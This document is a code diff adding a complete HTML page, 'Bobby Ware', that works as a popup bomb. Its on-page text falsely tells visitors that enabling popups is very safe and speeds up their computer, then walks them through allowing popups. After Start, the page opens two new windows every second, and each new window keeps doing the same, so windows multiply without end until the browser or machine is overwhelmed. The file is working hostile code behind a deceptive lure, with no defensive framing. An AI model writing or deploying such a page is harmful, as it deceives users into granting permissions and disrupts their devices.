@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Bobby Ware</title>
+<style>
+  html, body {
+    margin: 0;
+    height: 100%;
+    background: #0b1530;
+    color: #fff;
+    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    overflow: hidden;
+  }
+  #menuBg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    object-fit: cover;
+    z-index: 0;
+  }
+  #ui {
+    position: relative;
+    z-index: 1;
+    max-width: 420px;
+    padding: 24px;
+    background: rgba(0, 0, 0, 0.45);
+    border-radius: 12px;
+  }
+  h1 {
+    font-weight: 600;
+    margin-bottom: 8px;
+  }
+  p {
+    color: #e6e6ff;
+    font-size: 14px;
+    line-height: 1.4;
+  }
+  button {
+    background: #3b6cf0;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    padding: 12px 22px;
+    font-size: 15px;
+    margin: 8px 6px 0;
+    cursor: pointer;
+  }
+  button:disabled {
+    background: #33406b;
+    cursor: not-allowed;
+  }
+  button:hover:not(:disabled) {
+    background: #2f5adf;
+  }
+  #spawnImg, video {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    object-fit: cover;
+  }
+</style>
+</head>
+<body>
+
+<img id="menuBg" src="menu-bg.png" alt="">
+
+<div id="ui">
+  <h1>Bobby Ware</h1>
+  <p id="status">
+    Step 1: click "Enable Popups" (this is very safe this help kamputer run very very fast okey).<br><br>
+    Step 2: click "Start" to begin.
+  </p>
+  <button id="enableBtn">Enable Popups</button>
+  <button id="startBtn" disabled>Start</button>
+</div>
+
+<img id="spawnImg" src="spawn.jpg" alt="">
+<video id="vid" src="video.mp4" playsinline></video>
+
+<script>
+  const params    = new URLSearchParams(location.search);
+  const gen       = parseInt(params.get('gen') || '0', 10);
+  const CHILDREN  = 2;      // how many popups each spawn round opens
+  const SPAWN_MS  = 1000;   // how often a photo window spawns another round
+
+  const ui        = document.getElementById('ui');
+  const menuBg    = document.getElementById('menuBg');
+  const img       = document.getElementById('spawnImg');
+  const vid       = document.getElementById('vid');
+
+  document.title = gen === 0 ? 'Bobby Ware' : 'Bobby Ware #' + gen;
+
+  function randomWindowFeatures() {
+    const w = 380 + Math.floor(Math.random() * 220); // 380-600 wide
+    const h = 280 + Math.floor(Math.random() * 180); // 280-460 tall
+    const screenW = window.screen.width  || 1200;
+    const screenH = window.screen.height || 800;
+    const maxLeft = Math.max(screenW - w, 0);
+    const maxTop  = Math.max(screenH - h, 0);
+    const left = Math.floor(Math.random() * maxLeft);
+    const top  = Math.floor(Math.random() * maxTop);
+    return `width=${w},height=${h},left=${left},top=${top}`;
+  }
+
+  function spawnChildren() {
+    const nextGen = gen + 1;
+    for (let i = 0; i < CHILDREN; i++) {
+      window.open(`index.html?gen=${nextGen}`, '_blank', randomWindowFeatures());
+    }
+  }
+
+  function beginRoot() {
+    // Root window: plays the video with sound. Halfway through, starts spawning
+    // photo popups, then keeps spawning another round every SPAWN_MS forever.
+    menuBg.style.display = 'none';
+    ui.style.display  = 'none';
+    vid.style.display = 'block';
+
+    vid.addEventListener('error', () => {
+      document.body.insertAdjacentHTML('beforeend',
+        '<p style="position:fixed;top:10px;left:10px;color:#ff8a8a;' +
+        'font-size:14px;background:#0b1530;padding:8px 12px;border-radius:6px;">' +
+        'Video failed to load — make sure a file named exactly "video.mp4" ' +
+        'is in the same folder as index.html.</p>');
+    });
+
+    vid.play().catch(() => {
+      document.body.insertAdjacentHTML('beforeend',
+        '<p style="position:fixed;top:10px;left:10px;color:#ff8a8a;' +
+        'font-size:14px;background:#0b1530;padding:8px 12px;border-radius:6px;">' +
+        'Video could not autoplay in this browser.</p>');
+    });
+
+    let started = false;
+    vid.addEventListener('timeupdate', () => {
+      if (!started && vid.duration && vid.currentTime >= vid.duration / 2) {
+        started = true;
+        spawnChildren();
+        setInterval(spawnChildren, SPAWN_MS);
+      }
+    });
+  }
+
+  function beginChild() {
+    // Child windows: just the photo, instantly, then keep spawning another
+    // round of popups every SPAWN_MS, forever — this window never stops.
+    menuBg.style.display = 'none';
+    ui.style.display  = 'none';
+    img.style.display = 'block';
+    setInterval(spawnChildren, SPAWN_MS);
+  }
+
+  if (gen === 0) {
+    // Root window: require the user to grant popup permission, then Start.
+    document.getElementById('enableBtn').onclick = () => {
+      let test1, test2;
+      try {
+        test1 = window.open('about:blank', '_blank', 'width=100,height=100');
+        test2 = window.open('about:blank', '_blank', 'width=100,height=100,left=150');
+      } catch (e) {
+        test1 = null;
+        test2 = null;
+      }
+      setTimeout(() => {
+        const blocked1 = !test1 || test1.closed || typeof test1.closed === 'undefined';
+        const blocked2 = !test2 || test2.closed || typeof test2.closed === 'undefined';
+        if (!blocked1 && !blocked2) {
+          test1.close();
+          test2.close();
+          document.getElementById('status').textContent =
+            'Popups are enabled. Press Start to begin.';
+          document.getElementById('startBtn').disabled = false;
+        } else {
+          if (!blocked1) test1.close();
+          if (!blocked2) test2.close();
+          document.getElementById('status').textContent =
+            'Your browser blocked the popup. Look for a blocked-popup icon in the ' +
+            'address bar, choose "Always allow popups from this site," then click ' +
+            '"Enable Popups" again.';
+        }
+      }, 300);
+    };
+    document.getElementById('startBtn').onclick = beginRoot;
+  } else {
+    // Child windows: instant photo, no UI, no video.
+    beginChild();
+  }
+</script>
+
+</body>
+</html>
